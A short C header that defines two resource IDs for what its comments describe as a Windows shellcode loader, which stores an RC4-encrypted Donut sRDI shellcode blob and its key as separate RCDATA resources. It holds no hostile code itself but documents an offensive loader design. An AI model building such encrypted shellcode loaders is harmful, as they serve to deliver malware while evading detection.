/*
 * Resource IDs shared between loader.rc (windres input) and loader.c.
 * The RC4-encrypted shellcode blob and its RC4 key are stored as two
 * separate RCDATA resources of the generated executable.
 */
#ifndef SVC_LOADER_IDS_H
#define SVC_LOADER_IDS_H

#define IDR_PAYLOAD 101 /* RCDATA: RC4-encrypted Donut sRDI blob      */
#define IDR_KEY     102 /* RCDATA: raw RC4 key bytes                  */

#endif /* SVC_LOADER_IDS_H */
